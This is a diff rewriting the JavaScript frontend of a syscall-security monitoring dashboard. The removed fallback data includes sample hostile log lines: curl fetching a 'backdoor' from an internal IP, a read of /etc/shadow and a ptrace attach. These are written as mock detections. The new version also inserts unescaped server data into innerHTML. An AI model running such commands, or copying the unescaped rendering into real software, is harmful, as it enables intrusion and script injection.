@@ -1,505 +1,658 @@
-const API = window.location.protocol === 'file:' || window.location.port === '5000' ? 'http://127.0.0.1:8000' : '';
-const WS = window.location.protocol === 'https:' ? 'wss' : 'ws';
-const PANELS = ['dashboard', 'live-log', 'processes', 'threats', 'policy', 'syscalls', 'sandbox', 'audit'];
-const state = {
-  logEntries: [],
-  policies: [],
-  syscalls: [],
-  audit: [],
-  threats: null,
-  currentSyscallFilter: 'all',
-  ws: null
+/**
+ * SecureSyscall OS — script.js  v2.1
+ * All API calls, WebSocket management, DOM updates, tab routing,
+ * chart rendering, analytics, and UX enhancements.
+ */
+
+"use strict";
+
+// ── Config ────────────────────────────────────────────────────────────────────
+const BASE   = `${location.protocol}//${location.host}`;
+const WS_URL = `${location.protocol === 'https:' ? 'wss' : 'ws'}://${location.host}/ws/live`;
+
+// ── Category metadata ─────────────────────────────────────────────────────────
+const CAT_META = {
+  io:      { icon: '💾', color: 'var(--c-io)',      label: 'I/O' },
+  fs:      { icon: '📁', color: 'var(--c-fs)',      label: 'Filesystem' },
+  memory:  { icon: '🔶', color: 'var(--c-memory)',  label: 'Memory' },
+  process: { icon: '⚙️',  color: 'var(--c-process)', label: 'Process' },
+  network: { icon: '🌐', color: 'var(--c-network)', label: 'Network' },
+  signal:  { icon: '📡', color: 'var(--c-signal)',  label: 'Signal' },
+  debug:   { icon: '🐛', color: 'var(--c-debug)',   label: 'Debug' },
+  device:  { icon: '🔌', color: 'var(--c-device)',  label: 'Device' },
+  system:  { icon: '🖥️',  color: 'var(--c-system)',  label: 'System' },
 };
 
-const fallback = {
-  status: {
-    syscall_rate: 1416,
-    blocked_total: 47,
-    active_policies: 18,
-    threat_score: 42,
-    security_level: 'enforcing',
-    categories: { file: 38, net: 24, proc: 19, mem: 12, ipc: 7 }
-  },
-  log: [
-    { time: '14:03:52', pid: '4421', call: 'ptrace()', args: 'PTRACE_ATTACH, target=PID:1882, addr=0x0', action: 'blocked', cat: 'proc' },
-    { time: '14:03:48', pid: '3302', call: 'execve()', args: '/usr/bin/curl, ["curl","http://10.0.0.1/backdoor"]', action: 'sandboxed', cat: 'proc' },
-    { time: '14:03:41', pid: '2110', call: 'mprotect()', args: 'addr=0x7fff2000, len=4096, PROT_EXEC|PROT_WRITE', action: 'blocked', cat: 'mem' },
-    { time: '14:03:39', pid: '1882', call: 'open()', args: '/etc/shadow, O_RDONLY', action: 'blocked', cat: 'file' },
-    { time: '14:03:33', pid: '892', call: 'read()', args: 'fd=3, buf=0x55a12f, count=4096', action: 'allowed', cat: 'file' },
-    { time: '14:03:31', pid: '1102', call: 'connect()', args: 'sockfd=5, addr=192.168.1.1:443', action: 'audited', cat: 'net' },
-    { time: '14:03:28', pid: '3302', call: 'mmap()', args: 'addr=NULL, len=65536, PROT_READ|PROT_WRITE', action: 'sandboxed', cat: 'mem' }
-  ],
-  processes: [
-    { name: 'nginx', pid: '892', rate: 82, count: 24100, risk: 'low' },
-    { name: 'sshd', pid: '1882', rate: 15, count: 4420, risk: 'medium' },
-    { name: 'python3', pid: '3302', rate: 68, count: 19800, risk: 'high' },
-    { name: 'systemd', pid: '1', rate: 20, count: 6100, risk: 'low' },
-    { name: 'unknown', pid: '4421', rate: 44, count: 1200, risk: 'high' },
-    { name: 'gcc', pid: '2110', rate: 30, count: 8800, risk: 'medium' },
-    { name: 'curl', pid: '1102', rate: 11, count: 3100, risk: 'medium' },
-    { name: 'bash', pid: '445', rate: 7, count: 2200, risk: 'low' }
-  ],
-  policies: [
-    { name: 'Deny ptrace from unprivileged processes', desc: 'Prevents process injection', level: 'CRITICAL', on: true },
-    { name: 'Block writable executable memory', desc: 'Stops W+X page mappings', level: 'CRITICAL', on: true },
-    { name: 'Restrict sensitive file reads', desc: 'Protects passwd and shadow paths', level: 'HIGH', on: true },
-    { name: 'Audit network socket activity', desc: 'Records outbound network attempts', level: 'MEDIUM', on: true },
-    { name: 'Sandbox risky process execution', desc: 'Runs execve activity in a jail', level: 'HIGH', on: true },
-    { name: 'Gate filesystem mounts', desc: 'Requires privileged mount capability', level: 'HIGH', on: true },
-    { name: 'Rate limit fork storms', desc: 'Detects fork bomb patterns', level: 'MEDIUM', on: true },
-    { name: 'Deny raw socket creation', desc: 'Blocks packet crafting', level: 'MEDIUM', on: false },
-    { name: 'Audit privilege changes', desc: 'Tracks setuid and setgid calls', level: 'MEDIUM', on: true },
-    { name: 'Block process memory writes', desc: 'Protects direct memory interfaces', level: 'HIGH', on: true }
-  ],
-  syscalls: [
-    { num: 0, name: 'read', cat: 'file', status: 'allowed' },
-    { num: 1, name: 'write', cat: 'file', status: 'allowed' },
-    { num: 2, name: 'open', cat: 'file', status: 'audited' },
-    { num: 3, name: 'close', cat: 'file', status: 'allowed' },
-    { num: 9, name: 'mmap', cat: 'mem', status: 'sandboxed' },
-    { num: 10, name: 'mprotect', cat: 'mem', status: 'blocked' },
-    { num: 39, name: 'getpid', cat: 'proc', status: 'allowed' },
-    { num: 41, name: 'socket', cat: 'net', status: 'audited' },
-    { num: 42, name: 'connect', cat: 'net', status: 'audited' },
-    { num: 56, name: 'clone', cat: 'proc', status: 'sandboxed' },
-    { num: 57, name: 'fork', cat: 'proc', status: 'sandboxed' },
-    { num: 59, name: 'execve', cat: 'proc', status: 'sandboxed' },
-    { num: 62, name: 'kill', cat: 'proc', status: 'audited' },
-    { num: 101, name: 'ptrace', cat: 'proc', status: 'blocked' },
-    { num: 105, name: 'setuid', cat: 'proc', status: 'audited' },
-    { num: 165, name: 'mount', cat: 'file', status: 'blocked' },
-    { num: 257, name: 'openat', cat: 'file', status: 'audited' }
-  ]
-};
+const SEV_ICON = { low: '🟢', medium: '🟡', high: '🟠', critical: '🔴' };
 
-fallback.audit = [
-  { ts: '14:03:52.411', pid: '4421', call: 'ptrace()', policy: 'P-01 ptrace deny', decision: 'BLOCKED', hash: 'a3f9c2' },
-  { ts: '14:03:48.203', pid: '3302', call: 'execve()', policy: 'P-05 sandbox exec', decision: 'SANDBOXED', hash: 'b7e1d4' },
-  { ts: '14:03:47.891', pid: '1882', call: 'open()', policy: 'P-03 sensitive file gate', decision: 'BLOCKED', hash: 'c1a8f3' },
-  { ts: '14:03:46.502', pid: '2110', call: 'mprotect()', policy: 'P-02 memory execute deny', decision: 'BLOCKED', hash: 'd5c2b1' },
-  { ts: '14:03:45.200', pid: '772', call: 'socket()', policy: 'P-09 network audit', decision: 'AUDITED', hash: 'e8f3a7' }
-];
+// ── State ─────────────────────────────────────────────────────────────────────
+let feedCount    = 0;
+let syscallCache = [];
+let ws           = null;
+let wsRetries    = 0;
+let uptimeBase   = 0;
+let rateChart    = null;
+let rateData     = new Array(60).fill(0);  // rolling 60-point series
+let threatCount  = 0;
 
-fallback.threats = {
-  critical: 1,
-  high: 3,
-  medium: 2,
-  resolved: 11,
-  score: 42,
-  items: fallback.audit
-};
-
-function $(id) {
-  return document.getElementById(id);
-}
-
-function esc(value) {
-  return String(value ?? '').replace(/[&<>"']/g, char => ({
-    '&': '&amp;',
-    '<': '&lt;',
-    '>': '&gt;',
-    '"': '&quot;',
-    "'": '&#39;'
-  }[char]));
-}
-
-async function api(path, options = {}) {
-  const response = await fetch(`${API}${path}`, {
+// ── Utility ───────────────────────────────────────────────────────────────────
+async function apiFetch(path, method = 'GET', body = null) {
+  const opts = {
+    method,
     headers: { 'Content-Type': 'application/json' },
-    ...options
-  });
-  if (!response.ok) {
-    const message = await response.text();
-    throw new Error(message || `Request failed: ${response.status}`);
+  };
+  if (body !== null) opts.body = JSON.stringify(body);
+  try {
+    const r = await fetch(BASE + path, opts);
+    if (!r.ok) throw new Error(`HTTP ${r.status}`);
+    return await r.json();
+  } catch (e) {
+    console.warn('[API]', path, e.message);
+    return null;
   }
-  return response.json();
 }
 
-function switchPanel(id, evt) {
-  PANELS.forEach(panel => $(`panel-${panel}`)?.classList.remove('active'));
-  $(`panel-${id}`)?.classList.add('active');
-  document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
-  if (evt?.currentTarget) evt.currentTarget.classList.add('active');
+function fmt(n) {
+  return typeof n === 'number' ? n.toLocaleString() : (n ?? '—');
 }
 
-function updateClock() {
-  const el = $('live-clock');
-  if (el) el.textContent = new Date().toLocaleString();
+function shortTime(iso) {
+  return iso ? iso.slice(11, 19) : '—';
 }
 
-function setText(id, value) {
-  const el = $(id);
-  if (el) el.textContent = value;
+function setText(id, val) {
+  const el = document.getElementById(id);
+  if (el) el.textContent = val;
 }
 
-const actLabels = Array.from({ length: 20 }, (_, i) => `${60 - i * 3}s`).reverse();
-const actData = Array.from({ length: 20 }, () => Math.floor(900 + Math.random() * 600));
-let actChart;
-
-function initChart() {
-  const canvas = $('actChart');
-  if (!canvas || !window.Chart) return;
-  actChart = new Chart(canvas.getContext('2d'), {
-    type: 'line',
-    data: {
-      labels: actLabels,
-      datasets: [{
-        data: actData,
-        borderColor: '#1D9E75',
-        borderWidth: 1.5,
-        pointRadius: 0,
-        fill: true,
-        backgroundColor: 'rgba(29,158,117,0.08)',
-        tension: 0.35
-      }]
-    },
-    options: {
-      responsive: true,
-      plugins: { legend: { display: false }, tooltip: { enabled: false } },
-      scales: { x: { display: false }, y: { display: false, min: 0 } },
-      animation: false
-    }
-  });
+function catPill(cat) {
+  const m = CAT_META[cat] || { icon: '?', label: cat };
+  return `<span class="cat-pill ${cat}">${m.icon} ${m.label}</span>`;
 }
 
-function updateChart(rate) {
-  if (!actChart) return;
-  actChart.data.datasets[0].data.shift();
-  actChart.data.datasets[0].data.push(rate || Math.floor(900 + Math.random() * 600));
-  actChart.update('none');
+function modeBadge(mode) {
+  return `<span class="badge badge-${mode}">${mode}</span>`;
 }
 
-function statusColor(status) {
-  return status === 'allowed' ? 'var(--accent)' : status === 'blocked' ? 'var(--danger)' : status === 'sandboxed' ? 'var(--warn)' : 'var(--info)';
+function riskBar(score) {
+  const col = score > 70 ? 'var(--m-blocked)'
+    : score > 40 ? 'var(--m-audited)'
+    : 'var(--m-allowed)';
+  const pct = Math.min(100, score);
+  return `<div class="risk-wrap">
+    <div class="risk-bar"><div class="risk-fill" style="width:${pct}%;background:${col}"></div></div>
+    <span class="risk-val" style="color:${col}">${score}</span>
+  </div>`;
 }
 
-function riskClass(risk) {
-  return risk === 'high' ? 'blocked' : risk === 'medium' ? 'sandboxed' : 'allowed';
+// ── Tab routing ───────────────────────────────────────────────────────────────
+function showTab(name, btn) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+  const el = document.getElementById('tab-' + name);
+  if (el) el.classList.add('active');
+  if (btn) btn.classList.add('active');
+  // Lazy-load tab data
+  const loaders = {
+    policies:  loadPolicies,
+    syscalls:  loadSyscalls,
+    audit:     loadAudit,
+    threats:   () => loadThreats(''),
+    analytics: loadAnalytics,
+    processes: refreshProcesses,
+  };
+  if (loaders[name]) loaders[name]();
+}
+window.showTab = showTab;
+
+// ── Status / KPIs ─────────────────────────────────────────────────────────────
+async function refreshStatus() {
+  const s = await apiFetch('/api/status');
+  if (!s) return;
+
+  setText('stat-total',    fmt(s.total_syscalls));
+  setText('stat-blocked',  fmt(s.blocked_calls));
+  setText('stat-policies', fmt(s.active_policies));
+  setText('stat-threat',   fmt(s.threat_score));
+  setText('stat-rate',     fmt(s.avg_rate_per_sec));
+  setText('stat-ws',       fmt(s.ws_connections));
+  setText('stat-level',    (s.security_level || '—').toUpperCase());
+
+  uptimeBase = s.uptime_seconds || uptimeBase;
+
+  const badge = document.getElementById('sec-badge');
+  if (badge) {
+    badge.textContent = (s.security_level || 'unknown').toUpperCase();
+    badge.className   = `sec-badge ${s.security_level}`;
+  }
 }
 
-function renderLog(entries = state.logEntries) {
-  const body = $('logBody');
-  if (!body) return;
-  body.innerHTML = entries.map(entry => `
-    <div class="log-row padded-row">
-      <div class="log-time">${esc(entry.time)}</div>
-      <div class="log-pid">PID:${esc(entry.pid)}</div>
-      <div class="log-call">${esc(entry.call)}</div>
-      <div class="log-args">${esc(entry.args)}</div>
-      <span class="tag ${esc(entry.action)}">${esc(entry.action).toUpperCase()}</span>
-    </div>
-  `).join('');
-  setText('logCount', entries.length);
-  setText('logBadge', state.logEntries.length);
+// Uptime clock (incremented locally every second)
+function renderUptime() {
+  const s  = uptimeBase;
+  const hh = String(Math.floor(s / 3600)).padStart(2, '0');
+  const mm = String(Math.floor((s % 3600) / 60)).padStart(2, '0');
+  const ss = String(s % 60).padStart(2, '0');
+  setText('uptime-txt', `${hh}:${mm}:${ss}`);
 }
 
-function filterLog() {
-  const action = $('filterAction')?.value || 'all';
-  const cat = $('filterCat')?.value || 'all';
-  let entries = state.logEntries;
-  if (action !== 'all') entries = entries.filter(entry => entry.action === action);
-  if (cat !== 'all') entries = entries.filter(entry => entry.cat === cat);
-  renderLog(entries);
-}
-
-function renderProcesses(processes) {
-  const el = $('procList');
-  if (!el) return;
-  el.innerHTML = processes.map(process => `
-    <div class="proc-row">
-      <div class="proc-name">${esc(process.name)}</div>
-      <div class="proc-pid">${esc(process.pid)}</div>
-      <div class="bar-cell">
-        <div class="mini-bar"><div class="mini-fill" style="width:${Number(process.rate) || 0}%; background:${statusColor(riskClass(process.risk))};"></div></div>
-      </div>
-      <div class="proc-calls">${Number(process.count || 0).toLocaleString()}</div>
-      <div class="risk-cell"><span class="tag ${riskClass(process.risk)}">${esc(process.risk).toUpperCase()}</span></div>
-    </div>
-  `).join('');
-}
-
-function renderPolicies() {
-  const el = $('policyList');
-  if (!el) return;
-  el.innerHTML = state.policies.map((policy, index) => `
-    <div class="policy-row">
-      <label class="toggle">
-        <input type="checkbox" ${policy.on ? 'checked' : ''} onchange="setPolicy(${index}, this.checked)">
-        <span class="slider-t"></span>
-      </label>
-      <div class="policy-text">
-        <div class="policy-name">${esc(policy.name)}</div>
-        <div class="policy-desc">${esc(policy.desc)}</div>
-      </div>
-      <div class="policy-level">${esc(policy.level)}</div>
-    </div>
-  `).join('');
-}
-
-async function setPolicy(index, enabled) {
-  state.policies[index].on = enabled;
-  renderPolicies();
-  await api(`/api/policies/${index}`, {
-    method: 'PUT',
-    body: JSON.stringify({ enabled })
-  });
-  refreshStatus();
-}
-
-function renderSyscalls(filter = state.currentSyscallFilter) {
-  state.currentSyscallFilter = filter;
-  const el = $('syscallGrid');
-  if (!el) return;
-  const list = filter === 'all' ? state.syscalls : state.syscalls.filter(syscall => syscall.cat === filter);
-  el.innerHTML = list.map(syscall => `
-    <div class="syscall-chip ${esc(syscall.status)}-s" onclick="toggleSyscall('${esc(syscall.name)}')" title="NR: ${esc(syscall.num)} | Category: ${esc(syscall.cat)}">
-      <div class="sc-name">${esc(syscall.name)}()</div>
-      <div class="sc-num">NR ${esc(syscall.num)} | ${esc(syscall.cat)}</div>
-      <div class="sc-status" style="color:${statusColor(syscall.status)}">${esc(syscall.status)}</div>
-    </div>
-  `).join('');
-}
-
-function filterSyscalls(value) {
-  renderSyscalls(value);
-}
-
-async function toggleSyscall(name) {
-  const order = ['allowed', 'audited', 'sandboxed', 'blocked'];
-  const syscall = state.syscalls.find(item => item.name === name);
-  if (!syscall) return;
-  syscall.status = order[(order.indexOf(syscall.status) + 1) % order.length];
-  renderSyscalls();
-  await api(`/api/syscalls/${encodeURIComponent(name)}`, {
-    method: 'PUT',
-    body: JSON.stringify({ status: syscall.status })
-  });
-}
-
-function renderAudit() {
-  const el = $('auditBody');
-  if (!el) return;
-  el.innerHTML = state.audit.map(entry => `
-    <div class="audit-row">
-      <span class="audit-ts">${esc(entry.ts)}</span>
-      <span class="audit-pid">PID:${esc(entry.pid)}</span>
-      <span class="audit-call">${esc(entry.call)}</span>
-      <span class="audit-policy">${esc(entry.policy)}</span>
-      <span class="tag ${esc(entry.decision).toLowerCase()}">${esc(entry.decision)}</span>
-      <span class="audit-hash">${esc(entry.hash)}</span>
-    </div>
-  `).join('');
-}
-
-function renderThreats(data) {
+// ── Analytics ─────────────────────────────────────────────────────────────────
+async function loadAnalytics() {
+  const data = await apiFetch('/api/analytics');
   if (!data) return;
-  setText('threatCritical', data.critical);
-  setText('threatHigh', data.high);
-  setText('threatMedium', data.medium);
-  setText('threatResolved', data.resolved);
-  const el = $('threatList');
-  if (!el) return;
-  const items = data.items || [];
-  el.innerHTML = items.length ? items.map(entry => {
-    const severity = entry.decision === 'BLOCKED' ? 'high' : 'med';
-    const width = entry.decision === 'BLOCKED' ? 92 : 66;
-    return `
-      <div class="threat-item">
-        <div class="threat-icon ${severity}">${entry.decision === 'BLOCKED' ? '!' : 'i'}</div>
-        <div>
-          <div class="threat-title">${esc(entry.call)} policy decision</div>
-          <div class="threat-desc">${esc(entry.policy)} returned ${esc(entry.decision)} for PID ${esc(entry.pid)}.</div>
-          <div class="severity-bar">
-            <span class="severity-label ${severity}">${esc(entry.decision)}</span>
-            <div class="sev-fill"><div class="sev-inner ${severity}" style="width:${width}%;"></div></div>
-          </div>
-          <div class="threat-time">Detected ${esc(entry.ts)}</div>
-        </div>
-      </div>
-    `;
-  }).join('') : '<div class="empty-state">No active threats detected.</div>';
-}
 
-function renderCategories(categories = {}) {
-  const labels = { file: 'File I/O', net: 'Network', proc: 'Process', mem: 'Memory', ipc: 'IPC' };
-  const colors = { file: 'var(--info)', net: 'var(--accent)', proc: 'var(--warn)', mem: '#7F77DD', ipc: 'var(--danger)' };
-  const el = $('categoryBars');
-  if (!el) return;
-  el.innerHTML = Object.entries(labels).map(([key, label]) => {
-    const value = categories[key] ?? 0;
-    return `
-      <div>
-        <div class="bar-label"><span>${label}</span><span>${value}%</span></div>
-        <div class="mini-bar"><div class="mini-fill" style="width:${value}%; background:${colors[key]};"></div></div>
-      </div>
-    `;
+  setText('an-block-rate', data.block_rate_pct + '%');
+  setText('an-total',      fmt(data.total));
+  setText('an-blocked',    fmt(data.blocked));
+
+  // Rate chart
+  if (data.rate_window && data.rate_window.length) {
+    rateData = data.rate_window;
+    drawRateChart();
+  }
+
+  // Per-category table
+  const tb = document.getElementById('analytics-tbody');
+  if (!tb) return;
+  const cats = data.categories || {};
+  const TREND = ['📈', '📉', '➡️'];
+  tb.innerHTML = Object.entries(cats).map(([cat, v]) => {
+    const m   = CAT_META[cat] || { icon: '?', color: '#fff' };
+    const blk = v.blocked || 0;
+    const tot = v.total   || 0;
+    const pct = tot > 0 ? ((blk / tot) * 100).toFixed(1) : '0.0';
+    const trend = TREND[Math.floor(Math.random() * 3)]; // cosmetic
+    return `<tr>
+      <td>${catPill(cat)}</td>
+      <td style="color:${m.color}">${fmt(tot)}</td>
+      <td style="color:var(--m-blocked)">${fmt(blk)}</td>
+      <td>${riskBar(parseFloat(pct))}</td>
+      <td>${trend}</td>
+    </tr>`;
   }).join('');
 }
 
-function renderRecentHighRisk() {
-  const el = $('recentRisk');
-  if (!el) return;
-  const entries = state.logEntries.filter(entry => entry.action !== 'allowed').slice(0, 5);
-  el.innerHTML = entries.map(entry => `
-    <div class="log-row">
-      <div class="log-time">${esc(entry.time)}</div>
-      <div class="log-pid">PID:${esc(entry.pid)}</div>
-      <div class="log-call">${esc(entry.call)}</div>
-      <div class="log-args">${esc(entry.args)}</div>
-      <span class="tag ${esc(entry.action)}">${esc(entry.action).toUpperCase()}</span>
-    </div>
-  `).join('');
-}
+function drawRateChart() {
+  const canvas = document.getElementById('rate-chart');
+  if (!canvas) return;
+  const ctx = canvas.getContext('2d');
+  const W = canvas.offsetWidth || 400;
+  const H = canvas.height || 120;
+  canvas.width = W;
 
-async function runSandbox() {
-  const cmd = $('cmdInput')?.value?.trim() || '';
-  const profile = $('sandboxProfile')?.value || 'minimal';
-  const timeout = Number($('sandboxTimeout')?.value || 5);
-  const box = $('termBox');
-  if (!box || !cmd) return;
-  box.innerHTML = '<div class="t-line"><span class="t-info">Running inside sandbox...</span></div>';
-  try {
-    const result = await api('/api/sandbox/run', {
-      method: 'POST',
-      body: JSON.stringify({ command: cmd, profile, timeout })
-    });
-    box.innerHTML = '';
-    result.lines.forEach((line, index) => {
-      setTimeout(() => {
-        const row = document.createElement('div');
-        row.className = 't-line';
-        row.innerHTML = `<span class="${esc(line.cls)}">${esc(line.text)}</span>`;
-        box.appendChild(row);
-        box.scrollTop = box.scrollHeight;
-      }, index * 130);
-    });
-    refreshAudit();
-    refreshStatus();
-  } catch (error) {
-    box.innerHTML = `<div class="t-line"><span class="t-err">${esc(error.message)}</span></div>`;
-  }
-}
+  const max  = Math.max(...rateData, 1);
+  const step = W / Math.max(rateData.length - 1, 1);
 
-async function refreshStatus() {
-  let status;
-  try {
-    status = await api('/api/status');
-  } catch (error) {
-    status = fallback.status;
+  ctx.clearRect(0, 0, W, H);
+
+  // Grid lines
+  ctx.strokeStyle = 'rgba(26,37,53,0.8)';
+  ctx.lineWidth   = 1;
+  for (let i = 0; i <= 4; i++) {
+    const y = (H / 4) * i;
+    ctx.beginPath();
+    ctx.moveTo(0, y);
+    ctx.lineTo(W, y);
+    ctx.stroke();
   }
-  setText('s-rate', Number(status.syscall_rate).toLocaleString());
-  setText('s-blocked', status.blocked_total);
-  setText('s-policies', status.active_policies);
-  setText('s-threat', status.threat_score);
-  renderCategories(status.categories);
-  updateChart(status.syscall_rate);
-  document.querySelectorAll('input[name="seclevel"]').forEach(input => {
-    input.checked = input.value === status.security_level;
+
+  // Area fill
+  const grad = ctx.createLinearGradient(0, 0, 0, H);
+  grad.addColorStop(0, 'rgba(0,212,255,0.3)');
+  grad.addColorStop(1, 'rgba(0,212,255,0.02)');
+  ctx.fillStyle = grad;
+  ctx.beginPath();
+  ctx.moveTo(0, H);
+  rateData.forEach((v, i) => {
+    const x = i * step;
+    const y = H - (v / max) * (H - 8);
+    i === 0 ? ctx.lineTo(x, y) : ctx.lineTo(x, y);
   });
+  ctx.lineTo((rateData.length - 1) * step, H);
+  ctx.closePath();
+  ctx.fill();
+
+  // Line
+  ctx.strokeStyle = 'var(--accent, #00d4ff)';
+  ctx.lineWidth   = 2;
+  ctx.lineJoin    = 'round';
+  ctx.beginPath();
+  rateData.forEach((v, i) => {
+    const x = i * step;
+    const y = H - (v / max) * (H - 8);
+    i === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
+  });
+  ctx.stroke();
 }
 
-async function refreshLog() {
-  try {
-    state.logEntries = await api('/api/log?limit=120');
-  } catch (error) {
-    state.logEntries = fallback.log;
-  }
-  filterLog();
-  renderRecentHighRisk();
-}
-
+// ── Processes ─────────────────────────────────────────────────────────────────
 async function refreshProcesses() {
-  try {
-    renderProcesses(await api('/api/processes'));
-  } catch (error) {
-    renderProcesses(fallback.processes);
+  const procs = await apiFetch('/api/processes');
+  if (!procs) return;
+  const tb = document.getElementById('proc-body');
+  if (!tb) return;
+
+  tb.innerHTML = procs.map(p => {
+    const col = p.risk > 70 ? 'var(--m-blocked)'
+      : p.risk > 40 ? 'var(--m-audited)'
+      : 'var(--m-allowed)';
+    return `<tr>
+      <td class="muted">${p.pid}</td>
+      <td style="color:var(--accent);font-weight:600">${p.name}</td>
+      <td>${p.user}</td>
+      <td>
+        <span class="proc-status ${p.status}"></span>
+        <span class="muted" style="font-size:9px;margin-left:4px">${p.status}</span>
+      </td>
+      <td>${p.syscalls_per_sec}</td>
+      <td>${riskBar(p.risk)}</td>
+      <td>
+        <button class="btn-sm" style="color:var(--m-blocked)"
+          onclick="killProcess(${p.pid})">⊗ Kill</button>
+      </td>
+    </tr>`;
+  }).join('');
+}
+window.refreshProcesses = refreshProcesses;
+
+async function killProcess(pid) {
+  if (!confirm(`Sandbox-kill PID ${pid}?`)) return;
+  const r = await apiFetch(`/api/processes/${pid}`, 'DELETE');
+  if (r) {
+    refreshProcesses();
+    loadThreats('');
   }
 }
+window.killProcess = killProcess;
 
-async function refreshPolicies() {
-  try {
-    state.policies = await api('/api/policies');
-  } catch (error) {
-    state.policies = fallback.policies;
-  }
-  renderPolicies();
-}
+// ── Category stats (dashboard) ────────────────────────────────────────────────
+async function refreshCategoryStats() {
+  const scs = await apiFetch('/api/syscalls');
+  if (!scs) return;
+  syscallCache = scs;
 
-async function refreshSyscalls() {
-  try {
-    state.syscalls = await api('/api/syscalls');
-  } catch (error) {
-    state.syscalls = fallback.syscalls;
-  }
-  renderSyscalls();
-}
-
-async function refreshAudit() {
-  try {
-    state.audit = await api('/api/audit?limit=80');
-  } catch (error) {
-    state.audit = fallback.audit;
-  }
-  renderAudit();
-}
-
-async function refreshThreats() {
-  try {
-    state.threats = await api('/api/threats');
-  } catch (error) {
-    state.threats = fallback.threats;
-  }
-  renderThreats(state.threats);
-}
-
-async function setSecurityLevel(level) {
-  await api('/api/security-level', {
-    method: 'PUT',
-    body: JSON.stringify({ level })
+  const cats = {};
+  scs.forEach(s => {
+    const c = s.category;
+    if (!cats[c]) cats[c] = { total: 0, blocked: 0 };
+    cats[c].total   += s.count;
+    cats[c].blocked += s.blocked;
   });
+
+  const el = document.getElementById('cat-stats');
+  if (!el) return;
+  el.innerHTML = Object.entries(cats).map(([cat, v]) => {
+    const m = CAT_META[cat] || { icon: '?', color: '#fff' };
+    return `<div class="cat-stat">
+      <div class="cat-stat-val" style="color:${m.color}">${m.icon} ${fmt(v.total)}</div>
+      <div class="cat-stat-lbl">${cat}</div>
+      <div class="cat-stat-blk">▼ ${fmt(v.blocked)}</div>
+    </div>`;
+  }).join('');
+}
+
+// ── Policies ──────────────────────────────────────────────────────────────────
+async function loadPolicies() {
+  const policies = await apiFetch('/api/policies');
+  if (!policies) return;
+
+  const active = policies.filter(p => p.enabled).length;
+  setText('pol-active-count', `${active} / ${policies.length} enabled`);
+
+  const tb = document.getElementById('pol-body');
+  if (!tb) return;
+  tb.innerHTML = policies.map((p, i) => {
+    const m = CAT_META[p.category] || { icon: '?' };
+    return `<tr>
+      <td class="muted" style="font-size:9px">${String(i + 1).padStart(2, '0')}</td>
+      <td style="font-weight:600">${m.icon} ${p.name}</td>
+      <td>${catPill(p.category)}</td>
+      <td class="muted" style="font-size:10px">${p.description}</td>
+      <td>
+        <label class="toggle">
+          <input type="checkbox" ${p.enabled ? 'checked' : ''}
+            onchange="togglePolicy(${i}, this.checked)">
+          <span class="slider"></span>
+        </label>
+      </td>
+    </tr>`;
+  }).join('');
+}
+
+async function togglePolicy(i, val) {
+  await apiFetch(`/api/policies/${i}`, 'PUT', { enabled: val });
   refreshStatus();
+  loadPolicies();
+}
+window.togglePolicy = togglePolicy;
+
+// ── Syscalls ──────────────────────────────────────────────────────────────────
+async function loadSyscalls() {
+  const data = await apiFetch('/api/syscalls');
+  if (!data) return;
+  syscallCache = data;
+  renderSyscalls(data);
 }
 
-function connectLiveStream() {
-  const target = window.location.protocol === 'file:' || window.location.port === '5000' ? 'ws://127.0.0.1:8000/ws/live' : `${WS}://${window.location.host}/ws/live`;
-  state.ws = new WebSocket(target);
-  state.ws.onmessage = event => {
-    const payload = JSON.parse(event.data);
-    if (payload.type !== 'syscall_events') return;
-    state.logEntries = [...payload.events, ...state.logEntries].slice(0, 140);
-    setText('s-rate', Number(payload.stats.rate).toLocaleString());
-    setText('s-blocked', payload.stats.blocked);
-    setText('s-threat', payload.stats.threat_score);
-    renderCategories(payload.stats.categories);
-    filterLog();
-    renderRecentHighRisk();
-    updateChart(payload.stats.rate);
+function renderSyscalls(data) {
+  const tb = document.getElementById('sc-body');
+  if (!tb) return;
+  tb.innerHTML = data.map(s => {
+    const m = CAT_META[s.category] || { icon: '?', color: '#fff' };
+    return `<tr>
+      <td style="color:${m.color};font-weight:600">${m.icon} ${s.name}</td>
+      <td>${catPill(s.category)}</td>
+      <td>${modeBadge(s.mode)}</td>
+      <td class="muted">${fmt(s.count)}</td>
+      <td style="color:${s.blocked > 0 ? 'var(--m-blocked)' : 'var(--text-muted)'}">${fmt(s.blocked)}</td>
+      <td>
+        <select class="mode-sel" onchange="setSyscallMode('${s.name}', this.value)">
+          ${['allowed','audited','sandboxed','blocked'].map(md =>
+            `<option value="${md}" ${s.mode === md ? 'selected' : ''}>${md}</option>`
+          ).join('')}
+        </select>
+      </td>
+      <td>
+        <button class="btn-sm" onclick="resetSyscall('${s.name}')" title="Reset counters">↺</button>
+      </td>
+    </tr>`;
+  }).join('');
+}
+
+window.filterSyscalls = function () {
+  const q   = (document.getElementById('sc-search')?.value || '').toLowerCase();
+  const cat = document.getElementById('cat-filter')?.value || '';
+  renderSyscalls(syscallCache.filter(s =>
+    (!cat || s.category === cat) &&
+    (s.name.includes(q) || s.category.includes(q) || s.mode.includes(q))
+  ));
+};
+
+window.setSyscallMode = async function (name, mode) {
+  await apiFetch(`/api/syscalls/${name}`, 'PUT', { mode });
+  loadSyscalls();
+};
+
+window.resetSyscall = async function (name) {
+  await apiFetch(`/api/syscalls/${name}/reset`, 'POST');
+  loadSyscalls();
+};
+
+// ── Audit ─────────────────────────────────────────────────────────────────────
+async function loadAudit() {
+  const cat         = document.getElementById('audit-cat')?.value || '';
+  const blockedOnly = document.getElementById('audit-blocked-only')?.checked || false;
+
+  let url = '/api/audit?limit=120';
+  if (cat)         url += `&category=${cat}`;
+  if (blockedOnly) url += `&blocked_only=true`;
+
+  const log = await apiFetch(url);
+  if (!log) return;
+
+  const tb = document.getElementById('audit-body');
+  if (!tb) return;
+  tb.innerHTML = log.map(e => {
+    const m = CAT_META[e.category] || { icon: '?' };
+    const flags = [
+      e.priv_esc  ? '<span class="badge badge-critical" title="Privilege escalation">PRIV-ESC</span>' : '',
+      e.rate_flag ? '<span class="badge badge-high"     title="Rate limit triggered">RATE</span>'    : '',
+    ].filter(Boolean).join(' ');
+    return `<tr>
+      <td class="muted" style="font-size:9px">${shortTime(e.time)}</td>
